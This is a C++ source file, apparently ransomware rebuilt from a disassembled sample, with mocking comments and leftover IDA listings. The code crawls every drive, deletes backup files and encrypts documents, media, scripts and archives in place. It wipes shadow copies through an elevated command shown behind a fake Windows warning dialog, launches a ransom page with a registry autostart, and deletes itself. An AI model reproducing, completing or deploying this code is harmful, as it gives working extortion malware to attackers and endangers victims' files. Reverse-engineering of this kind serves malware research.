    std::string runas{ InnerDecrypt("+C+v*(*t+%") }; //runas in unicode
    std::string cmd{ InnerDecrypt("*%*;*Y") }; //cmd
    std::string winDir{ InnerDecrypt("*%%mv$v$++*N*(*Y*-+++%v$v$") }; //c:\\windows\/\/
    SHELLEXECUTEINFO si;
    memset(&si.fMask, 0, 0x38);
    si.cbSize = sizeof(si);
    si.fMask = SEE_MASK_NOCLOSEPROCESS;
    si.hwnd = NULL;
    si.lpVerb = runas.c_str();
    si.lpFile = cmd.c_str();
    si.lpParameters = command.c_str();
    si.lpDirectory = winDir.c_str();
    si.nShow = SW_HIDE;
    si.hInstApp = NULL;
    if (execFunc)
      if (((BOOL(*) (SHELLEXECUTEINFO*))execFunc)(&si)) {
        if (uhnd)
          FreeLibrary(uhnd);
        std::cout << "fcc2242b5b0bbeec2ef58f19a676e619" << std::endl;
        if (shnd)
          FreeLibrary(shnd);
        shadowCopyOff = true; // shadow copying turned off
        ExitThread(0);
      }
    Sleep(10000);
    counter++;
  }
  return true;
}

void EncryptFileStats(const std::wstring& encrypt_to, const std::wstring& read_from) {
  HCRYPTPROV h_prov;
  HCRYPTKEY h_key;
  HCRYPTHASH h_hash;
  CryptAcquireContext(&h_prov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
  CryptImportKey(h_prov, kRsaPublicKey, sizeof(kRsaPublicKey), NULL, 0, &h_key);
  CryptCreateHash(h_prov, CALG_SHA, h_key, 0, &h_hash);
  CryptHashData(h_hash, kRsaPublicKey, sizeof(kRsaPublicKey), 0);
  CryptDeriveKey(h_hash, CALG_DSS_SIGN, h_hash, 0, &h_key); //does not work - pathetic
  auto first_hnd = CreateFileW(encrypt_to.data(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  auto second_hnd = CreateFileW(read_from.data(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL);
  DWORD chunk_size = 0;
  if (CryptEncrypt(h_key, h_hash, true, 0, NULL, &chunk_size, 0)) {
    std::cout << "c2b98ea9211698a01f5fc50d6319f27f" << std::endl;
  }
  auto dyn_buffer = malloc(65);
  DWORD bytes_read = 0;
  bool read_complete = false;
  while (!read_complete) {
    ReadFile(second_hnd, dyn_buffer, 40, &bytes_read, 0);
    if (bytes_read != 40) {
      read_complete = true;
    }
    std::string triple_0{ InnerDecrypt("v$%xv$%xv$%x") };
    memcpy((char*)dyn_buffer + bytes_read, triple_0.data(), triple_0.length());
    DWORD bytes_to_write = 40;
    if (!CryptEncrypt(h_key, h_hash, read_complete, 0, (unsigned char*)dyn_buffer, &bytes_to_write, chunk_size)) {
      std::cout << "3d4df3f87b73e501d4d6dc3aed4505b3" << std::endl;
    }
    DWORD bytes_written = 0;
    if (!WriteFile(first_hnd, dyn_buffer, bytes_to_write, &bytes_written, 0)) {
      std::cout << "05251493539bff331bb6d32613f108a1" << std::endl;
    }
  }
  if (second_hnd) {
    CloseHandle(second_hnd);
  }
  if (first_hnd) {
    CloseHandle(first_hnd);
  }
  if (h_key) {
    CryptDestroyKey(h_key);
  }
  if (h_prov) {
    CryptReleaseContext(h_prov, 0);
  }
  //free(NULL); //original code - mem leak
  free(dyn_buffer);
  return;
}

void WriteFilesStats() {
  std::string result_str{ ("v+Y-vCY,v%vYYtvYY;Y;Y;v$*(") }; //WORKSTATMMM\n
  result_str += formatted_mac_string;
  result_str += "\n";
  for (auto i = 0; i < vector_filetype_count.size(); i++) {
    std::string current_sum = std::to_string(vector_filetype_count[i]);
    std::string current_ext = converter.to_bytes(all_extensions[i]);
    result_str += current_ext;
    result_str += "->";
    result_str += current_sum;
    result_str += "\n";
  }
  temp_file = temp_path + converter.from_bytes(enigma_dot_rsa);
  auto file_hnd = CreateFileW(temp_file.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (file_hnd == INVALID_HANDLE_VALUE) { //written values for the first time
    DWORD unused;
    auto file_size = GetFileSize(file_hnd, &unused);
    SetFilePointer(file_hnd, file_size, NULL, FILE_BEGIN);
    auto encrypted_str = RsaEncrypt(result_str.data(), result_str.length());
    encrypted_str += "::";
    encrypted_str += "737";
    encrypted_str += "\n";
    WriteFile(file_hnd, encrypted_str.data(), encrypted_str.length(), &unused, NULL);
    CloseHandle(file_hnd);
  }
  auto new_file = converter.from_bytes(enigma_dot_rsa);
  auto desktop_file = desktop_dir + converter.from_bytes("\\") + converter.from_bytes(enigma_dot_rsa) + converter.from_bytes("2");
  EncryptFileStats(desktop_file, temp_file.length() ? temp_file : desktop_file);
  auto dtop_hnd = CreateFileW(desktop_file.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (dtop_hnd != INVALID_HANDLE_VALUE) {
    DWORD unused = 0;
    auto file_size = GetFileSize(dtop_hnd, &unused);
    SetFilePointer(dtop_hnd, file_size, NULL, FILE_BEGIN);
    std::string expl{ InnerDecrypt("%m*v+K+x*$%m") };
    std::string str_to_encrypt; //:expl:
    str_to_encrypt.append(mark_737);
    str_to_encrypt.append(expl);
    str_to_encrypt.append(i_hate_c);
    WriteFile(dtop_hnd, str_to_encrypt.data(), str_to_encrypt.length(), &unused, 0);
    CloseHandle(dtop_hnd);
  }
  Sleep(500);
  DeleteFileW(temp_file.data());
  MoveFileW(desktop_file.data(), temp_file.data());
  auto cur_file_path = desktop_dir + converter.from_bytes("\\") + converter.from_bytes(enigma_dot_rsa);
  CopyFileW(temp_file.data(), new_file.data(), false);
  auto html_file = temp_path + converter.from_bytes(html_file_name);
  CopyFileW(temp_file.data(), html_file.data(), false);
  auto falcon_file = temp_path + converter.from_bytes(falconStr);
  DeleteFileW(falcon_file.data());
  auto falcon_hnd = CreateFileW(falcon_file.data(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (falcon_hnd != INVALID_HANDLE_VALUE) {
    auto ok_str{ InnerDecrypt("*-*,") };
    ok_str += "\n";
    DWORD unused = 0;
    WriteFile(falcon_hnd, ok_str.data(), ok_str.length(), &unused, 0);
    CloseHandle(falcon_hnd);
  }
  std::cout << "5da7f788fbfb90e38e9bdd6fbd3809ee" << std::endl;
  char buff[56];
  memset(buff, 0, 56);
  auto js_file = converter.to_bytes(temp_path) + js_file_name;
  SHELLEXECUTEINFO exec_info;
  memset(&exec_info, 0, sizeof(exec_info));
  exec_info.fMask = SEE_MASK_NOCLOSEPROCESS;
  exec_info.hwnd = NULL;
  std::string win_dir = InnerDecrypt("*%%mv$v$++*N*(*Y*-+++%v$v$");
  exec_info.lpDirectory = win_dir.data();
  exec_info.lpFile = js_file.data();
  exec_info.nShow = SW_SHOW;
  exec_info.hInstApp = NULL;
  auto shell32_hnd = LoadLibrary(shell32.data());
  if (shell32_hnd) {
    auto exec_fptr = GetProcAddress(shell32_hnd, shell_exec.data());
    ((BOOL(*) (SHELLEXECUTEINFO*))exec_fptr)(&exec_info);
    FreeLibrary(shell32_hnd);
  }
  std::string value{ InnerDecrypt("*******Y*v*C***v*v*Y*****Y*C*t") }; //ffdbbde
  CreateRegKey(value, js_file);
  std::cout << "f9db6dc9df72b37b2aff3aa89dc004cc" << std::endl;
}
bool RecodeFile(const std::string& file_name) {
  bool ret_res = false;
  LARGE_INTEGER move_dist{ 0 };
  auto file_hnd = CreateFile(file_name.data(), FILE_READ_DATA | FILE_WRITE_DATA, 0, NULL, OPEN_EXISTING, 0, 0);
  if (file_hnd == INVALID_HANDLE_VALUE) {
    std::cout << "e0a99eb6719a0ee147abf2c84924ec43" << std::endl;
    goto end;
  }
  HCRYPTPROV prov;
  if (CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, 0) == false) {
    if (GetLastError() == NTE_BAD_KEYSET) {
      if (CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
        std::cout << "c16d4b5633ef48e21240f9c205a51d7d" << std::endl;
      } else {
        std::cout << "4e4e11b5bcbeca35f69a0d34dda8532f" << std::endl;
      }
    } else {
      std::cout << "9c9271b7008e1a60b63b57b4a2499add" << std::endl;
      goto end;
    }
  } else {
    std::cout << "6e7664292d28a2edb4d4a10ec4e730de" << std::endl;
  }
  HCRYPTHASH hash;
  if (CryptCreateHash(prov, CALG_SHA, NULL, 0, &hash) == false) {
    std::cout << "21bc97d801dfc4054a6d8ec436368fe1" << std::endl;
    goto end;
  }
  if (CryptHashData(hash, (BYTE*)rsa_hash_wchar, lstrlenW(rsa_hash_wchar), 0) == false) {
    std::cout << "e25b995205fbcdc8c97e53eb4bab3c56" << std::endl;
    goto end;
  }
  HCRYPTKEY key;
  if (CryptDeriveKey(prov, CALG_AES_128, hash, 0, &key) == false) {
    std::cout << "2b0959927c2daf10993fdc58e5f9b1b3" << std::endl;
    goto end;
  }
  auto read_buffer = new BYTE[1008];
  bool read_finished = false;
  while (!read_finished) {
    SetFilePointerEx(file_hnd, move_dist, NULL, FILE_BEGIN);
    DWORD bytes_read = 0;
    if (ReadFile(file_hnd, read_buffer, 992, &bytes_read, 0) == false) {
      std::cout << "3f87863cfb5f6f170ef5ce3dcce687ac" << std::endl;
      goto end;
    }
    if (bytes_read < 992) {
      read_finished = true;
    }
    if (CryptEncrypt(key, NULL, read_finished, 0, read_buffer, &bytes_read, sizeof(read_buffer)) == false) {
      std::cout << "b7a4557f321d7b15c1d0e8467406834c" << std::endl;
      goto end;
    }
    SetFilePointerEx(file_hnd, move_dist, NULL, FILE_BEGIN);
    if (WriteFile(file_hnd, read_buffer, bytes_read, &bytes_read, 0) == false) {
      std::cout << "fa767fb82e34db6133d741c264c223ef" << std::endl;
      goto end;
    }
    move_dist.QuadPart += bytes_read;
  }
  DWORD bytes_written;
  if (WriteFile(file_hnd, derived_key.data(), derived_key.length(), &bytes_written, 0)) {
    ret_res = true;
  }
  std::cout << "f5fdab66c661da597346a30502b972d4" << std::endl;
end:
  if (file_hnd) {
    CloseHandle(file_hnd);
  }
  if (read_buffer) {
    delete[] read_buffer;
  }
  if (hash) {
    CryptDestroyHash(hash);
  }
  std::cout << "ec3ccb55b2c18539b8dc20ff46b62fe4" << std::endl;
  if (key) {
    CryptDestroyKey(key);
  }
  std::cout << "f4611278ced8ec2734ffa9960a4bac96" << std::endl;
  if (prov) {
    CryptReleaseContext(prov, 0);
  }
  std::cout << "242a9219220fac40ed505b18f4f273d0" << std::endl;
  return ret_res;
}

DWORD WINAPI FileCodingThread(LPVOID lpParameter) {
  Sleep(2000);
  std::cout << "38c35991edec6854e8e5e76fd3b899c7" << std::endl;
  std::string cur_file_name;
  while (true) {
    int i = 0;
    while (i < 4) {
      if (found_files_queues[i].try_pop(cur_file_name)) {
        break;
      }
      i++;
    }
    if (cur_file_name.length()) {
      std::string parsed_name(cur_file_name, cur_file_name.find_last_of("/"), std::string::npos); // = get_file_name_wstr 
      if (parsed_name == html_file_name || parsed_name == work_statistic) {
        continue;
      }
      //prepairing for file name changing
      std::string rev_slash{ InnerDecrypt("C-") };
      std::string double_slash{ InnerDecrypt("v$v$") };
      std::string sem_2_slash{ InnerDecrypt("%mv$v$") };
      std::string sem_4_slash{ InnerDecrypt("%mv$v$v$v$") };
      std::string dot{ InnerDecrypt("C(") };
      //making standard windows path for file name
      std::string new_file_name = std::regex_replace(cur_file_name, std::regex{ rev_slash }, double_slash); //changed / to \\ 
      new_file_name = std::regex_replace(new_file_name, std::regex{ sem_2_slash }, sem_4_slash); //changed :\\ to :\\\\ 
      if (enigma_dot_rsa_newlines) {
        auto encrypted_file_name = new_file_name + dot_enigma;
      }
      //original code
      auto old_file_name = std::regex_replace(cur_file_name, std::regex{ rev_slash }, double_slash); //changed / to \\ 
      old_file_name = std::regex_replace(old_file_name, std::regex{ sem_2_slash }, sem_4_slash); //changed :\\ to :\\\\ 
      if (TestExists(converter.from_bytes(old_file_name))) {
        if (!MoveFile(old_file_name.data(), new_file_name.data())) { //failed
          std::cout << "331cf99772964710c9652d9520e90668" << std::endl;
        } else {
          if (!RecodeFile(new_file_name)) { //failed
            std::cout << "dbf3f6c3910c0ba90afd65a791fcfa6a" << std::endl;
          } else {
            //add to totals vector
            std::cout << "d1ed9cc5e1ba199ae255030a3988e155" << std::endl;
            std::string cur_file_ext = cur_file_name.substr(cur_file_name.find_last_of('.'), std::string::npos);
            auto pos = std::find(all_extensions.begin(), all_extensions.end(), converter.from_bytes(cur_file_ext));
            vector_filetype_count[pos - all_extensions.begin()]++;
            std::cout << "374c48183907470abccb957a73b7e3c9" << std::endl;
            total_encrypted_counter++;
          }
        }
      } else {
        std::cout << "6bee91c93beb97ee8a93eac9ee7ee2e8" << std::endl;
      }
    } else {
      if (finished) {
        no_more_files = true;
        WriteFilesStats();
        std::cout << "a83aa1ae2462a9c6569d5cea9a7c3b0a" << std::endl;
        RecodeFile(workstatistic_file_name);
        std::cout << "84e991e65b3d1d14770823cee5ccd17b" << std::endl;
        file_coding_thread_not_finished = false;
        ExitThread(0);
      } else {
        Sleep(100);
      }
    }
  }

}

void DeleteSelf() {
  char module_name[260];
  auto res = GetModuleFileName(NULL, module_name, sizeof(module_name)); //get cur file path
  if (res == 0) {
    return;
  }
  char path_name[260];
  res = GetShortPathName(path_name, path_name, sizeof(path_name));
  if (res == 0) {
    return;
  }
  std::string ping_com = InnerDecrypt("C-*%Cx+x*N*(*+Cx%KC(%KC(%KC(%KCxC*Cx*Y*v*$Cx"); // /c ping 8.8.8.8 & del
  std::string null_n_pause = InnerDecrypt("Cx%(%(CxY(vvY$CxC*Cx+x*t+v+%*v"); // >> NUL & pause
  auto command = ping_com + module_name; //delete this file
  command += null_n_pause; // you dog!
  std::string env_var = InnerDecrypt("Y%*-*;v%+x*v*%"); //ComSpec
  char interpreter_name[260];
  GetEnvironmentVariable(env_var.c_str(), interpreter_name, sizeof(interpreter_name));
  std::cout << "de880676deb1482d0f309c98e1892bc5" << std::endl;
  Sleep(2000);
  auto shell_hnd = LoadLibrary(shell32.c_str());
  if (shell_hnd == NULL) {
    return;
  }
  std::string shell_exec_proc_str =  InnerDecrypt("v%*K*v*$*$Yv+K*v*%+v+Y*vv+"); //ShellExecuteW
  auto shell_exec_proc = GetProcAddress(shell_hnd, shell_exec_proc_str.c_str());
  if (shell_exec_proc != 0) {
    ((HINSTANCE (*)(HWND, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR, INT))shell_exec_proc)(NULL, NULL, interpreter_name, command.c_str(), NULL, 0);
  }
  FreeLibrary(shell_hnd);
  return;
}


bool TurhShadowCopyOff_2() {
  auto lhnd = LoadLibrary(user32.data());
  FARPROC mBoxFunc = NULL, execFunc = NULL;
  if (lhnd)
    mBoxFunc = GetProcAddress(lhnd, InnerDecrypt("Y; *v + %+%*t*+*vYC*-+KYt").data()); //MessageBoxA
  auto shnd = LoadLibrary(shell32.data());
  if (shnd)
    execFunc = GetProcAddress(shnd, shell_exec.data()); //ShellExec;
  auto command = "/C \"" + vssAdmCommand + "\"";
  auto decoyMessage = InnerDecrypt("$-((-t-C((-x(((;(;----Cx(--x(((%-x(x($($(xCx(C(;(v-t(,(xCx(K(+($(v(;(v(;(K--Cx(CCx-Y(x(N(,(((C-%-(Cx-t(K-t-C(v($-%C(Cx$;(x(*($(K-C(vCx$Y$xCx(Y(,--Cx((-C($(v(;-,Cx(K(+($(v(;(v(;(K(NC(");// text in cp-1251: Посторонняя программа внесла изменения в файловую систему. Нажмите ДА для отмены изменений. 
  if (mBoxFunc)
    ((int (WINAPI*) (HWND, LPCTSTR, LPCSTR, UINT))mBoxFunc)(NULL, decoyMessage.data(), "Windows", MB_OK);  //how original
  std::string runas{ InnerDecrypt("+C+v*(*t+%") }; //runas in unicode
  std::string cmd{ InnerDecrypt("*%*;*Y") }; //cmd
  std::string winDir{ InnerDecrypt("*%%mv$v$++*N*(*Y*-+++%v$v$") }; //c:\\windows\/\/
  SHELLEXECUTEINFO si;
  si.cbSize = sizeof(si);
  si.fMask = SEE_MASK_NOCLOSEPROCESS;
  si.hwnd = NULL;
  si.lpVerb = runas.c_str();
  si.lpFile = cmd.c_str();
  si.lpParameters = command.c_str();
  si.lpDirectory = winDir.c_str();
  si.nShow = SW_HIDE;
  si.hInstApp = NULL;
  if (execFunc) {
    if (((BOOL(*) (SHELLEXECUTEINFO*))execFunc)(&si)) {
      if (lhnd)
        FreeLibrary(lhnd);
      FreeLibrary(shnd);
    }
  }
  return true;
}


//parses whole filesystem for specific files
DWORD WINAPI FsParser(LPVOID lpParameter) {
  auto kernel_hnd = LoadLibrary(kernel32.data());
  auto mutex = (HANDLE)lpParameter;
  if (kernel_hnd != NULL) {
    std::string  find_first_file{ InnerDecrypt("Y**N*(*YY**N+C+%+YY**N*$*vv+") }; //FindFirstFileW
    std::string find_next_file{ InnerDecrypt("Y**N*(*YY(*v+K+YY**N*$*vv+") };  //FindNextFileW
    std::string find_close{ InnerDecrypt("Y**N*(*YY%*$*-+%*v") }; //FindClose
    auto find_first_proc = GetProcAddress(kernel_hnd, find_first_file.data());
    auto find_next_proc = GetProcAddress(kernel_hnd, find_next_file.data());
    auto find_close_proc = GetProcAddress(kernel_hnd, find_close.data());
    while (directories_queue.unsafe_size()) {
      std::string current_dir;
      if (!directories_queue.try_pop(current_dir)) { //chef's touch
        continue;
      }
      std::string regex{ InnerDecrypt("C-CmC(Cm") }; ///*.*
      std::string pattern = current_dir + regex;

      WIN32_FIND_DATAW found_data;
      auto search_hnd = ((HANDLE(*) (LPCSTR, LPWIN32_FIND_DATAW))find_first_proc)(pattern.data(), &found_data);
      if (search_hnd == INVALID_HANDLE_VALUE) {
        GetLastError();
        continue;
      }
      while (true) {
        if (!((BOOL(*) (HANDLE, LPWIN32_FIND_DATAW))find_next_proc)(search_hnd, &found_data)) {
          GetLastError();
          ((BOOL(*) (HANDLE))find_close_proc)(search_hnd);
          std::cout << "4c1f9f0bdc4499f354a4f1560f07be71" << std::endl;
          break;
        }
        if (!directories.empty()) {
          auto res = std::find(directories.begin(), directories.end(), found_data.cFileName);
          if (res == directories.end()) {
            continue;
          }
        }
        if (found_data.cFileName == converter.from_bytes(".")) { //another chef's touch
          continue;
        }
        if (found_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
          std::string new_dir = current_dir + "/" + converter.to_bytes(found_data.cFileName);
          directories_queue.push(new_dir);
        } else {
          auto target_file = current_dir + "/" + converter.to_bytes(found_data.cFileName);
          std::string cur_file_ext = target_file.substr(target_file.find_last_of('.'), std::string::npos);
          for (auto& c : cur_file_ext) {
            c = std::tolower(c, std::locale(""));
          }
          decltype(archive_exts_vector.begin()) pos;
          pos = std::find(backup_exts_vector.begin(), backup_exts_vector.end(), converter.from_bytes(cur_file_ext));
          if (pos != backup_exts_vector.end()) {
            DeleteFile(target_file.data()); //delete all backups!!
          }
          pos = std::find(doc_exts_vector.begin(), doc_exts_vector.end(), converter.from_bytes(cur_file_ext));
          if (pos != doc_exts_vector.end()) {
            //adding to concur queue boilerplate
            WaitForSingleObject(mutex, 1000); //no result check - riiight, noob
            files_to_encode.push_back(target_file);
            files_found++;
            found_files_queues[0].push(target_file);
            ReleaseMutex(mutex);
          }
          pos = std::find(script_exts_vector.begin(), script_exts_vector.end(), converter.from_bytes(cur_file_ext));
          if (pos != script_exts_vector.end()) {
            WaitForSingleObject(mutex, 1000);
            files_to_encode.push_back(target_file);
            files_found++;
            found_files_queues[1].push(target_file);
            ReleaseMutex(mutex);
          }
          pos = std::find(media_exts_vector.begin(), media_exts_vector.end(), converter.from_bytes(cur_file_ext));
          if (pos != media_exts_vector.end()) {
            WaitForSingleObject(mutex, 1000);
            files_to_encode.push_back(target_file);
            files_found++;
            found_files_queues[2].push(target_file);
            ReleaseMutex(mutex);
          }
          pos = std::find(archive_exts_vector.begin(), archive_exts_vector.end(), converter.from_bytes(cur_file_ext));
          if (pos != archive_exts_vector.end()) {
            WaitForSingleObject(mutex, 1000);
            files_to_encode.push_back(target_file);
            files_found++;
            found_files_queues[2].push(target_file);
            ReleaseMutex(mutex);
          }
        }
      }
    }
  }
  std::cout << "890d833a0cbb35165c05e1aa9d539e5a" << std::endl;
  Sleep(1000);
  ExitThread(0);
}
//this three - no idea
/*
text:00C9D3B3 queryUsersOnEncryptedFile proc near     ; DATA XREF: 0000000000BEFA90o
.text:00C9D3B3                                         ; 0000000000BEFA94o ...
.text:00C9D3B3
.text:00C9D3B3 lpFileName      = dword ptr -4
.text:00C9D3B3 lpThreadParameter= dword ptr  8
.text:00C9D3B3
.text:00C9D3B3                 push    ebp
.text:00C9D3B4                 mov     ebp, esp
.text:00C9D3B6                 push    ecx             ; ecx = lpFileName
.text:00C9D3B7                 push    esi
.text:00C9D3B8                 mov     esi, 2710h
.text:00C9D3BD
.text:00C9D3BD loc_C9D3BD:                             ; CODE XREF: queryUsersOnEncryptedFile+16j
.text:00C9D3BD                 push    1000            ; dwMilliseconds
.text:00C9D3C2                 call    ds:Sleep
.text:00C9D3C8                 dec     esi
.text:00C9D3C9                 jnz     short loc_C9D3BD
.text:00C9D3CB                 lea     eax, [ebp+lpFileName]
.text:00C9D3CE                 push    eax             ; pUsers
.text:00C9D3CF                 push    [ebp+lpFileName] ; lpFileName
.text:00C9D3D2                 call    ds:QueryUsersOnEncryptedFile
.text:00C9D3D8                 push    esi             ; dwExitCode
.text:00C9D3D9                 call    ds:ExitThread
*/
DWORD __stdcall QueryUsersThread(LPVOID lpThreadParameter) {
  for (int i = 0; i < 10000; i++) {
    Sleep(1000);
  }
  QueryUsersOnEncryptedFile(NULL, NULL);
  return 0;
}
/*
.text:00C9D3E0 setFileValidData proc near              ; DATA XREF: _main+EFo
.text:00C9D3E0
.text:00C9D3E0 s               = dword ptr  0
.text:00C9D3E0 lpThreadParameter= dword ptr  8
.text:00C9D3E0
.text:00C9D3E0                 push    ebp
.text:00C9D3E1                 mov     ebp, esp
.text:00C9D3E3                 push    ecx             ; var4
.text:00C9D3E4                 push    ecx             ; var8
.text:00C9D3E5                 push    esi
.text:00C9D3E6                 mov     esi, 10000
.text:00C9D3EB
.text:00C9D3EB loc_C9D3EB:                             ; CODE XREF: setFileValidData+17j
.text:00C9D3EB                 push    3E8h            ; dwMilliseconds
.text:00C9D3F0                 call    ds:Sleep
.text:00C9D3F6                 dec     esi
.text:00C9D3F7                 jnz     short loc_C9D3EB ; 10000sec ~ 2 hours
.text:00C9D3F9                 push    dword ptr [ebp-4]
.text:00C9D3FC                 push    dword ptr [ebp-8] ; ValidDataLength
.text:00C9D3FF                 push    dword ptr [ebp-4] ; hFile
.text:00C9D402                 call    ds:SetFileValidData
.text:00C9D408                 push    esi             ; dwExitCode
.text:00C9D409                 call    ds:ExitThread
.text:00C9D409 setFileValidData endp
*/
DWORD __stdcall SetFileValidThread(LPVOID lpThreadParameter) {
  for (int i = 0; i < 10000; i++) {
    Sleep(1000);
  }
  SetFileValidData(NULL, NULL);
  return 0;
}
/*
.text:00C9D410 getBinaryType   proc near               ; DATA XREF: _main+FBo
.text:00C9D410
.text:00C9D410 lpApplicationName= dword ptr -4
.text:00C9D410 lpThreadParameter= dword ptr  8
.text:00C9D410
.text:00C9D410                 push    ebp
.text:00C9D411                 mov     ebp, esp
.text:00C9D413                 push    ecx
.text:00C9D414                 push    esi
.text:00C9D415                 mov     esi, 10000
.text:00C9D41A
.text:00C9D41A loc_C9D41A:                             ; CODE XREF: getBinaryType+16j
.text:00C9D41A                 push    1000            ; dwMilliseconds
.text:00C9D41F                 call    ds:Sleep
.text:00C9D425                 dec     esi
.text:00C9D426                 jnz     short loc_C9D41A
.text:00C9D428                 push    [ebp+lpApplicationName] ; lpBinaryType
.text:00C9D42B                 push    [ebp+lpApplicationName] ; lpApplicationName
.text:00C9D42E                 call    ds:GetBinaryTypeW
.text:00C9D434                 push    esi             ; dwExitCode
.text:00C9D435                 call    ds:ExitThread
.text:00C9D435 getBinaryType   endp
*/
DWORD __stdcall GetBinaryTypeThread(LPVOID lpThreadParameter) {
  for (int i = 0; i < 10000; i++) {
    Sleep(1000);
  }
  GetBinaryType(NULL, NULL);
  return 0;
}

int main(int argc, char** argv) {
  char** args = argv;
  std::cout << "b2ea16364568d46e0a3926515b88c057" << std::endl;
  auto user_hnd = LoadLibrary(user32.c_str());
  /*
  if (user_hnd != NULL) {
    auto show_window_proc = GetProcAddress(user_hnd, InnerDecrypt("v%*K*-++v+*N*(*Y*-++").c_str()); //ShowWindow
    auto con = GetConsoleWindow();
    ((BOOL(WINAPI *)(HWND, int))show_window_proc)(con, SW_HIDE); //hide console window
  }
  */
  //this threads do nothing
  CreateThread(NULL, 0, QueryUsersThread, NULL, 0, NULL);
  CreateThread(NULL, 0, SetFileValidThread, NULL, 0, NULL);
  CreateThread(NULL, 0, GetBinaryTypeThread, NULL, 0, NULL);

  formatted_mac_string = GetMac();
  FillDocExts();
  FillArcExts();
  FillMediaExts();
  FillBackupExts();
  FillDirs();
  FillScriptsExts();
  std::cout << "a71a7083ff33a0bc2f119b3c544b2336" << std::endl;
  wchar_t temp_path_wstr[260];
  GetTempPathW(260, temp_path_wstr);
  std::cout << "4cb47093b9e7f63875bd97a0d63b9c20" << std::endl;
  strlen(*args); //and nothing happens
  std::cout << "2332e8a46ceb92a892b5f108cf3e9828" << std::endl;
  std::string fffdebfeedffd = InnerDecrypt("*******Y*v*C***v*v*Y*****Y"); //ffdebfeedffd - not used here
  /*
  CreateAutostartRegKey();
  */
  std::cout << "3d8ce7b467eb2f65dbdb6a4fb7f43ce5" << std::endl;
  std::wstring vbp = converter.from_bytes(InnerDecrypt("+**v+C+NCx*C*t*YCx+x+C*-*++C*t*;*;*v+C"));  //very bad programmer
  auto ehnd = CreateEventW(NULL, false, false, vbp.data()); //stupid singleton check from books
  if (ehnd == INVALID_HANDLE_VALUE) {
    CloseHandle(NULL); //whyyyyyyy?
    return 0;
  }
  auto err = GetLastError();
  if (err == ERROR_ALREADY_EXISTS) {
    CloseHandle(ehnd);
    return 0;
  }
  std::string locale{ "null" };
  //set locale based on second argument
  if (argc > 1) {
    locale = argv[1];
  }
  if (!CreateKeysGenerateHtml(locale.c_str())) {
    return 0;
  }
  CreateThread(0, 0, CheckEncFilesStats, 0, 0, 0);
  std::cout << "52853a9d3f54f093c8b8ca60690b9481" << std::endl;
  std::cout << "034cf33b3aa544260f4cb7696ca5effe" << std::endl;
  getDrives();
  std::cout << "24beeebd5bd8104687909c4495ff927c" << std::endl;
  CreateThread(0, 0, turnShadowCopyOff, 0, 0, 0);
  CreateThread(0, 0, FileCodingThread, 0, 0, 0);
  GetStdHandle(STD_OUTPUT_HANDLE); // WHYYYYYYYY??
  auto main_mtx = CreateMutex(NULL, false, NULL);
  if (main_mtx == NULL) {
    return 0;
  }
  HANDLE threads[5];
  for (int i = 0; i < 5; i++) {
    HANDLE thread_hnd = CreateThread(0, 0, FsParser, main_mtx, 0, 0);
    if (thread_hnd == NULL) {
      return 0;
    }
    threads[i] = thread_hnd;
  }
  std::cout << "fd2cb885c620ac81a83386a787db1265" << std::endl;
  WaitForMultipleObjects(5, threads, true, INFINITE);
  std::cout << "af4ffc475c5aa34c56cc8c116c722810" << std::endl;
  auto workstatistic_file_name = temp_path + converter.from_bytes(work_statistic);
  DeleteFileW(workstatistic_file_name.data());
  auto hnd = CreateFileW(workstatistic_file_name.data(), GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, false);
  if (hnd != INVALID_HANDLE_VALUE) {
    for (auto file : files_to_encode) {
      DWORD bytes_written;
      WriteFile(hnd, file.data(), file.length(), &bytes_written, false);
    }
    CloseHandle(hnd);
  }
  finished = true;
  for (int i = 0; i < 5; i++) {
    CloseHandle(threads[i]);
  }
  while (file_coding_thread_not_finished) {
    Sleep(3000);
    std::cout << "6eafe0db8c68ea00f53dbafc6fb82cea" << std::endl;
  }
  std::cout << "b72e30e215687bdd60241a72f91ce81b" << std::endl;
  Sleep(7000);
  TurhShadowCopyOff_2();
  Sleep(25000);
  DeleteSelf();
}
